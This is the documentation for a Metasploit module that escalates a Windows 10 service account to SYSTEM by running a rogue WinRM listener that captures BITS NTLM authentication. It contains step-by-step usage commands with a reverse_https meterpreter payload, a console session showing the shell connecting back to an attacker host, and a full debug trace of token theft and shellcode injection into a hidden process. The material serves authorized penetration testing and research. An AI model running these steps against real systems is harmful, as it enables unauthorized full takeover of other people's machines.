## Vulnerable Application

Windows 10 and Windows servers where WinRM is not running.

Labs experiment has shown that Windows 7 is not vulnerable because BITS service does not attempt to shoot on
WinRM port (see **Module Description** section of this document). Windows XP has not been tested, but if Windows 7 is not
vulnerable, it is likely neither its case.

Regarding Windows 10 and Windows servers, **the availability of port 5985 is a necessary and sufficient condition for
being vulnerable**.

This module exploits BITS behavior which tries to authenticate on local WinRM server (port 5985) even if this service is not running.
As this module runs a fake service on WinRM port to steal a SYSTEM token, this port must be available.
However, please note that WinRM service is natively running on windows servers preventing to run this exploit successfully.

Nevertheless, if WinRM service is disabled by an admin, or just killed, the operating system becomes vulnerable.

## Verification Steps

1. get a meterpreter session which has either SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privilege.
1. Do: `use exploits/windows/local/bits_ntlm_token_impersonation`
1. Do: `set SESSION <previous meterpreter session>`
1. Do: `set PAYLOAD windows/meterpreter/reverse_https`
1. Do: `set LHOST <your ip>`
1. Do: `set LPORT <your port>`
1. Do: `exploit`
1. A new meterpreter session should pop.

## Options

HOST_PROCESS &#8594; The process which will be launched as SYSTEM and execute metasploit shellcode.
This process should normally be hidden because launched without graphical interface. However, during lab experiments, some
processes has shown persistent screen effects. For instance, experiments with calc.exe was tested and a
buggy unresponsive window appeared and persisted until next reboot. Default choice is notepad.exe and it has not shown any
screen effects during lab experiments.

SESSION &#8594; index of the previous meterpreter session in through of which the exploit will be run.

SHUTDOWN_SERVICES &#8594; This boolean determines if ruby module should attempt to terminate WinRM and BITS if they
are found running. Indeed, both services must be down for the exploit to succeed (WinRM because we want to put a fake WinRM
service listening on its port, and BITS because the vulnerable behavior occurs at its startup). Default value is false for
multiple reasons. First the exploit is designed to wait for BITS to terminate by itself and you may get a shell even if it is
still running at the end of check. Secondly, in common usecases (previous meterpreter session running as LOCAL SERVICE), you
don't have sufficient privileges to do that. You only can do it if you are in administrator group. Thirdly, attempting to
terminate a service may trigger antiviruses, may be logged and may cause problems on the target system.

WINRM_RPORT &#8594; Port on which the exploit impersonating a genuine WinRM service will listen on remote target. Default
value is default WinRM port (5985). However, in some Windows configuration, WinRM default port can be set to 47001. This is
the case for instance if no WinRM listener is set. More information regarding this here:
https://docs.microsoft.com/en-us/windows/win32/winrm/obtaining-data-from-the-local-computer
If the exploit fails, you may want to try other ports commonly used by WinRM.

## Scenarios

Let's assume you have in any way compromised a service process such as IIS for instance. So your meterpreter session should
look like this:
```
meterpreter > sysinfo
Computer        : DESKTOP-5VBUUE9
OS              : Windows 10 (10.0 Build 18362).
Architecture    : x64
System Language : fr_FR
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
```

By default, service users hold the SE_IMPERSONATE_NAME privilege so this exploit is mainly designed to escalate from
a service account to local system. Lab experiments has shown it works for both LOCAL SERVICE and NETWORK SERVICE:

```
msf6 exploit(exploit/multi/handler) > use exploit/windows/local/bits_ntlm_token_impersonation
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bits_ntlm_token_impersonation) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https

msf6 exploit(windows/local/bits_ntlm_token_impersonation) > exploit

[*] Started HTTPS reverse handler on https://192.168.1.33:443
[*] Executing automatic check (disable AutoCheck to override)
[!] BITS is currently running. It must be down for the exploit to succeed.
[!] BITS is running. Don't panic, the exploit should handle this, but you have to wait for BITS to terminate.
[+] The target appears to be vulnerable.
[*] Launching notepad to host the exploit...
[+] Process 5044 launched.
[*] Injecting exploit into 5044...
[*] Exploit injected. Injecting payload into 5044...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] https://192.168.1.33:444 handling request from 192.168.1.248; (UUID: fsjcbuvp) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 2 opened (192.168.1.33:444 -> 192.168.1.248:51077) at 2020-12-11 08:56:29 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


## Module Description

This module exploits BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts.
The exploit dll (loaded through a previous unprivilegied meterpreter session) launches a fake WinRM server which listens
on port 5985 and triggers BITS.
When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token.
This token is then used to launch a new process as SYSTEM user.
In the case of this exploit, an invisible notepad is launched and shellcode is written inside and executed.
Thus, this exploit doesn't write any file on the disk.

This exploit has been discovered by Antonio Cocomazzi, Andrea Pierini and Roberto (0xea31) and it has been implemented in
metasploit on the basis of their proof of concept available on their github repository:

https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
https://github.com/antonioCoco/RogueWinRM

This exploit has been successfully tested on :
- Windows 10 (10.0 Build 19041) 32 bits
- Windows 10 Pro, Version 1903 (10.0 Build 18362) 64 bits

This exploit failed because of no BITS authentication attempt on:
- Windows 7 (6.1 Build 7601, Service Pack 1) 32 bits

## Warnings

- **SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are required.**
- **WinRM and in a lesser extent BITS must not be running.**
- As this dll exploit runs a service on the target (Fake WinRM on port 5985),
a firewall popup may appear on target screen. Thus, this exploit is not completely silent.
- Windows servers are not vulnerable because a genuine WinRM service is already running.

## Debugging

You may want to debug or reverse engineer this exploit. You need first to compile the dll sources with DEBUGTRACE flag.
Then, when launching the exploit, you can get runtime debug messages. Here are complete debug messages during a successful exploitation:

```
1   0.00000000	[7188] [dllmain] Entry point.
2   0.00020640	[7188] [extract_metasploit_data] WinRM port: 5985
3   0.00035820	[7188] [extract_metasploit_data] Process to launch: notepad.exe
4   0.00039800	[7188] [extract_metasploit_data] shellcode length: 626
5   0.00055150	[7188] [createProcessMethod] Attempting to enable SE_IMPERSONATE_NAME privilege...
6   0.00128340	[7188] [EnablePriv] SUCCESS: Privilege enabled.
7   0.00360550	[7188] [startListener] SUCCESS: WSAStartup initialized
8   0.00363250	[7188] [startListener] SUCCESS: getaddrinfo initialized. host:127.0.0.1, port: 5985
9   0.00439900	[7188] [startListener] SUCCESS: socket created.
10  0.00447850	[7188] [startListener] SUCCESS: socket bound.
11  0.00449390	[7188] [startListener] SUCCESS: socket is now listening for incoming connexions.
12  1.00682116	[7188] [isBitsRunning] Checking if BITS is running (It should not)...
13  1.00756419	[7188] [isBitsRunning] SUCCESS: BITS is not running.
14  1.00760865	[7188] [triggerBits] Attempting to start BITS...
15  1.27990735	[7188] [startListener] SUCCESS: socket accept stage successful.
16  1.27999246	[7188] [handleListener] Rogue WinRM service now listening for connection on port 5985.
17  1.28006208	[7188] [handleNTLMPConnection] Received http negotiate request.
18  1.28009701	[7188] [hexDump] Hexdump of packet:
19  1.28023875	[7188] [hexDump]   0000  50 4f 53 54 20 2f 77 73 6d 61 6e 20 48 54 54 50  POST /wsman HTTP
20  1.28033876	[7188] [hexDump]   0010  2f 31 2e 31 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e  /1.1..Connection
21  1.28043485	[7188] [hexDump]   0020  3a 20 4b 65 65 70 2d 41 6c 69 76 65 0d 0a 43 6f  : Keep-Alive..Co
22  1.28052747	[7188] [hexDump]   0030  6e 74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c  ntent-Type: appl
23  1.28062499	[7188] [hexDump]   0040  69 63 61 74 69 6f 6e 2f 73 6f 61 70 2b 78 6d 6c  ication/soap+xml
24  1.28071892	[7188] [hexDump]   0050  3b 63 68 61 72 73 65 74 3d 55 54 46 2d 31 36 0d  ;charset=UTF-16.
25  1.28080654	[7188] [hexDump]   0060  0a 41 75 74 68 6f 72 69 7a 61 74 69 6f 6e 3a 20  .Authorization:
26  1.28090227	[7188] [hexDump]   0070  4e 65 67 6f 74 69 61 74 65 20 59 47 77 47 42 69  Negotiate YGwGBi
27  1.28100324	[7188] [hexDump]   0080  73 47 41 51 55 46 41 71 42 69 4d 47 43 67 47 6a  sGAQUFAqBiMGCgGj
28  1.28108621	[7188] [hexDump]   0090  41 59 42 67 6f 72 42 67 45 45 41 59 49 33 41 67  AYBgorBgEEAYI3Ag
29  1.28115559	[7188] [hexDump]   00a0  49 4b 42 67 6f 72 42 67 45 45 41 59 49 33 41 67  IKBgorBgEEAYI3Ag
30  1.28125131	[7188] [hexDump]   00b0  49 65 6f 6b 49 45 51 45 35 55 54 45 31 54 55 31  IeokIEQE5UTE1TU1
31  1.28134823	[7188] [hexDump]   00c0  41 41 41 51 41 41 41 4c 65 79 43 4f 49 4a 41 41  AAAQAAALeyCOIJAA
32  1.28144515	[7188] [hexDump]   00d0  6b 41 4e 77 41 41 41 41 38 41 44 77 41 6f 41 41  kANwAAAA8ADwAoAA
33  1.28154385	[7188] [hexDump]   00e0  41 41 43 67 43 36 52 77 41 41 41 41 39 45 52 56  AACgC6RwAAAA9ERV
34  1.28162599	[7188] [hexDump]   00f0  4e 4c 56 45 39 51 4c 54 56 57 51 6c 56 56 52 54  NLVE9QLTVWQlVVRT
35  1.28167975	[7188] [hexDump]   0100  6c 58 54 31 4a 4c 52 31 4a 50 56 56 41 3d 0d 0a  lXT1JLR1JPVVA=..
36  1.28172791	[7188] [hexDump]   0110  55 73 65 72 2d 41 67 65 6e 74 3a 20 4d 69 63 72  User-Agent: Micr
37  1.28177559	[7188] [hexDump]   0120  6f 73 6f 66 74 20 57 69 6e 52 4d 20 43 6c 69 65  osoft WinRM Clie
38  1.28182483	[7188] [hexDump]   0130  6e 74 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67  nt..Content-Leng
39  1.28187311	[7188] [hexDump]   0140  74 68 3a 20 30 0d 0a 48 6f 73 74 3a 20 6c 6f 63  th: 0..Host: loc
40  1.28192329	[7188] [hexDump]   0150  61 6c 68 6f 73 74 3a 35 39 38 35 0d 0a 0d 0a     alhost:5985....
41  1.28192329	[7188]
42  1.28198123	[7188] [processNtlmBytes] -- handleType1 start --
43  1.28448606	[7188] [HandleType1] Result of AcceptSecurityContext() = status: 0x90312--
44  1.28453183	[7188] [processNtlmBytes] -- handleType1 end --
45  1.28457534	[7188] [forge_ntlmssp_challenge_responses] Forging http response type2 packet...
46  1.28464592	[7188] [hexDump] Hexdump of packet:
47  1.28471112	[7188] [hexDump]   0000  48 54 54 50 2f 31 2e 31 20 34 30 31 20 0d 0a 57  HTTP/1.1 401 ..W
48  1.28477061	[7188] [hexDump]   0010  57 57 2d 41 75 74 68 65 6e 74 69 63 61 74 65 3a  WW-Authenticate:
49  1.28485692	[7188] [hexDump]   0020  20 4e 65 67 6f 74 69 61 74 65 20 6f 59 49 42 43   Negotiate oYIBC
50  1.28487158	[7188] [hexDump]   0030  7a 43 43 41 51 65 67 41 77 6f 42 41 61 45 4d 42  zCCAQegAwoBAaEMB
51  1.28495753	[7188] [hexDump]   0040  67 6f 72 42 67 45 45 41 59 49 33 41 67 49 4b 6f  gorBgEEAYI3AgIKo
52  1.28498507	[7188] [hexDump]   0050  6f 48 78 42 49 48 75 54 6c 52 4d 54 56 4e 54 55  oHxBIHuTlRMTVNTU
53  1.28507006	[7188] [hexDump]   0060  41 41 43 41 41 41 41 48 67 41 65 41 44 67 41 41  AACAAAAHgAeADgAA
54  1.28509665	[7188] [hexDump]   0070  41 41 31 77 6f 72 69 6f 34 36 75 39 5a 6c 55 6e  AA1worio46u9ZlUn
55  1.28518021	[7188] [hexDump]   0080  6f 63 4c 41 41 45 41 41 41 41 41 41 4a 67 41 6d  ocLAAEAAAAAAJgAm
56  1.28520679	[7188] [hexDump]   0090  41 42 57 41 41 41 41 43 67 43 36 52 77 41 41 41  ABWAAAACgC6RwAAA
57  1.28528929	[7188] [hexDump]   00a0  41 39 45 41 45 55 41 55 77 42 4c 41 46 51 41 54  A9EAEUAUwBLAFQAT
58  1.28532350	[7188] [hexDump]   00b0  77 42 51 41 43 30 41 4e 51 42 57 41 45 49 41 56  wBQAC0ANQBWAEIAV
59  1.28540862	[7188] [hexDump]   00c0  51 42 56 41 45 55 41 4f 51 41 43 41 42 34 41 52  QBVAEUAOQACAB4AR
60  1.28544271	[7188] [hexDump]   00d0  41 42 46 41 46 4d 41 53 77 42 55 41 45 38 41 55  ABFAFMASwBUAE8AU
61  1.28552401	[7188] [hexDump]   00e0  41 41 74 41 44 55 41 56 67 42 43 41 46 55 41 56  AAtADUAVgBCAFUAV
62  1.28554428	[7188] [hexDump]   00f0  51 42 46 41 44 6b 41 41 51 41 65 41 45 51 41 52  QBFADkAAQAeAEQAR
63  1.28563356	[7188] [hexDump]   0100  51 42 54 41 45 73 41 56 41 42 50 41 46 41 41 4c  QBTAEsAVABPAFAAL
64  1.28566802	[7188] [hexDump]   0110  51 41 31 41 46 59 41 51 67 42 56 41 46 55 41 52  QA1AFYAQgBVAFUAR
65  1.28575194	[7188] [hexDump]   0120  51 41 35 41 41 51 41 48 67 42 45 41 45 55 41 55  QA5AAQAHgBEAEUAU
66  1.28578627	[7188] [hexDump]   0130  77 42 4c 41 46 51 41 54 77 42 51 41 43 30 41 4e  wBLAFQATwBQAC0AN
67  1.28586805	[7188] [hexDump]   0140  51 42 57 41 45 49 41 56 51 42 56 41 45 55 41 4f  QBWAEIAVQBVAEUAO
68  1.28590250	[7188] [hexDump]   0150  51 41 44 41 42 34 41 52 41 42 46 41 46 4d 41 53  QADAB4ARABFAFMAS
69  1.28598428	[7188] [hexDump]   0160  77 42 55 41 45 38 41 55 41 41 74 41 44 55 41 56  wBUAE8AUAAtADUAV
70  1.28601146	[7188] [hexDump]   0170  67 42 43 41 46 55 41 56 51 42 46 41 44 6b 41 42  gBCAFUAVQBFADkAB
71  1.28608716	[7188] [hexDump]   0180  77 41 49 41 47 73 53 5a 71 37 62 7a 74 59 42 41  wAIAGsSZq7bztYBA
72  1.28613508	[7188] [hexDump]   0190  41 41 41 41 41 3d 3d 0d 0a 53 65 72 76 65 72 3a  AAAAA==..Server:
73  1.28618777	[7188] [hexDump]   01a0  20 4d 69 63 72 6f 73 6f 66 74 2d 48 54 54 50 41   Microsoft-HTTPA
74  1.28620350	[7188] [hexDump]   01b0  50 49 2f 32 2e 30 0d 0a 43 6f 6e 74 65 6e 74 2d  PI/2.0..Content-
75  1.28625381	[7188] [hexDump]   01c0  4c 65 6e 67 74 68 3a 20 30 0d 0a 0d 0a 00 00     Length: 0......
76  1.28625381	[7188]
77  1.28628480	[7188] [handleNTLMPConnection] Sending the 401 http response with ntlm type 2 challenge...
78  1.28635943	[7188] [handleNTLMPConnection] 401 http response sent.
79  1.28725624	[7188] [handleNTLMPConnection] SUCCESS: Received http packet with ntlm type3 response.
80  1.28733253	[7188] [hexDump] Hexdump of packet:
81  1.28734791	[7188] [hexDump]   0000  50 4f 53 54 20 2f 77 73 6d 61 6e 20 48 54 54 50  POST /wsman HTTP
82  1.28743696	[7188] [hexDump]   0010  2f 31 2e 31 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e  /1.1..Connection
83  1.28746414	[7188] [hexDump]   0020  3a 20 4b 65 65 70 2d 41 6c 69 76 65 0d 0a 43 6f  : Keep-Alive..Co
84  1.28755128	[7188] [hexDump]   0030  6e 74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c  ntent-Type: appl
85  1.28757834	[7188] [hexDump]   0040  69 63 61 74 69 6f 6e 2f 73 6f 61 70 2b 78 6d 6c  ication/soap+xml
86  1.28766000	[7188] [hexDump]   0050  3b 63 68 61 72 73 65 74 3d 55 54 46 2d 31 36 0d  ;charset=UTF-16.
87  1.28767395	[7188] [hexDump]   0060  0a 41 75 74 68 6f 72 69 7a 61 74 69 6f 6e 3a 20  .Authorization:
88  1.28775859	[7188] [hexDump]   0070  4e 65 67 6f 74 69 61 74 65 20 6f 58 63 77 64 61  Negotiate oXcwda
89  1.28778541	[7188] [hexDump]   0080  41 44 43 67 45 42 6f 6c 6f 45 57 45 35 55 54 45  ADCgEBoloEWE5UTE
90  1.28787005	[7188] [hexDump]   0090  31 54 55 31 41 41 41 77 41 41 41 41 41 41 41 41  1TU1AAAwAAAAAAAA
91  1.28789675	[7188] [hexDump]   00a0  42 59 41 41 41 41 41 41 41 41 41 46 67 41 41 41  BYAAAAAAAAAFgAAA
92  1.28798091	[7188] [hexDump]   00b0  41 41 41 41 41 41 57 41 41 41 41 41 41 41 41 41  AAAAAAWAAAAAAAAA
93  1.28800118	[7188] [hexDump]   00c0  42 59 41 41 41 41 41 41 41 41 41 46 67 41 41 41  BYAAAAAAAAAFgAAA
94  1.28809083	[7188] [hexDump]   00d0  41 41 41 41 41 41 57 41 41 41 41 44 58 43 69 4f  AAAAAAWAAAADXCiO
95  1.28811765	[7188] [hexDump]   00e0  49 4b 41 4c 70 48 41 41 41 41 44 79 65 33 4e 77  IKALpHAAAADye3Nw
96  1.28817153	[7188] [hexDump]   00f0  34 39 70 77 2f 4f 35 37 6d 67 42 70 66 51 59 57  49pw/O57mgBpfQYW
97  1.28822196	[7188] [hexDump]   0100  4b 6a 45 67 51 51 41 51 41 41 41 4f 6e 6d 38 2b  KjEgQQAQAAAOnm8+
98  1.28828132	[7188] [hexDump]   0110  45 37 77 57 65 36 41 41 41 41 41 41 3d 3d 0d 0a  E7wWe6AAAAAA==..
99  1.28834140	[7188] [hexDump]   0120  55 73 65 72 2d 41 67 65 6e 74 3a 20 4d 69 63 72  User-Agent: Micr
100 1.28840005	[7188] [hexDump]   0130  6f 73 6f 66 74 20 57 69 6e 52 4d 20 43 6c 69 65  osoft WinRM Clie
101 1.28845811	[7188] [hexDump]   0140  6e 74 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67  nt..Content-Leng
102 1.28851688	[7188] [hexDump]   0150  74 68 3a 20 30 0d 0a 48 6f 73 74 3a 20 6c 6f 63  th: 0..Host: loc
103 1.28857553	[7188] [hexDump]   0160  61 6c 68 6f 73 74 3a 35 39 38 35 0d 0a 0d 0a     alhost:5985....
104 1.28857553	[7188]
105 1.28861415	[7188] [handleNTLMPConnection] Using ntlm type3 response in AcceptSecurityContext()...
106 1.28866363	[7188] [processNtlmBytes] -- handleType3 start --
107 1.28932333	[7188] [HandleType3] Result of AcceptSecurityContext() = status: 0x0--
108 1.28935909	[7188] [processNtlmBytes] -- handleType3 end --
109 1.28939426	[7188] [handleNTLMPConnection] Shutting down RogueWinRM service properly...
110 1.28953993	[7188] [handleNTLMPConnection] RogueWinRM service is now down.
111 1.32062924	[7188] [triggerBits] SUCCESS: BITS triggered!
112 1.32064247	[7188] [RunRogueWinRM] authresult 0
113 1.32069910	[7188] [IsTokenSystem] Checking if token is SYSTEM...
114 1.32073796	[7188] [IsTokenSystem] SUCCESS: Token is SYSTEM.
115 1.32080293	[7188] [RunRogueWinRM] Launching new process through CreateProcessWithTokenW().
116 1.32268882	[7188] [RunRogueWinRM] SUCCESS: target process launched as SYSTEM.
117 1.32270396	[7188] [RunRogueWinRM] Attempting to allocate executable memory space in spawned process...
118 1.32278264	[7188] [RunRogueWinRM] SUCCESS: executable memory space successfully allocated.
119 1.32282817	[7188] [RunRogueWinRM] Attempting to write shellcode in spawned process...
120 1.32286501	[7188] [RunRogueWinRM] SUCCESS: shellcode written into SYSTEM process.
121 1.32288563	[7188] [RunRogueWinRM] Attempting to trigger shellcode from spawned process...
122 1.32295120	[7188] [RunRogueWinRM] PWNED ! executing shellcode as SYSTEM.
123 1.32297337	[7188] [dllmain] Exit status: 0
```
